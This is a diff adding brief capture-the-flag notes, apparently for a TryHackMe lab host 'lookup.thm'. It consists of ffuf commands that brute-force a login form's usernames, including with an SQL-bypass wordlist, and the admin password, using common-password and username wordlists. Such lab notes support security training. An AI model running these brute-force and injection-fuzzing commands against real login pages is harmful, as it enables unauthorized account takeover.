@@ -1,0 +1,14 @@
+Brute Force on Username :--->
+
+$ ffuf -w sqlbypass.txt -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=asdf' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 10
+
+
+Brute Force on Password Section:--->
+
+$ ffuf -w /usr/share/wordlists/SecLists/Passwords/2020-200_most_used_passwords.txt -X POST -u http://lookup.thm/login.php -d 'username=admin&password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8
+
+$ ffuf -w /usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt -X POST -u http://lookup.thm/login.php -d 'username=admin&password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8
+
+$ ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=REDACTED' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8
+
+
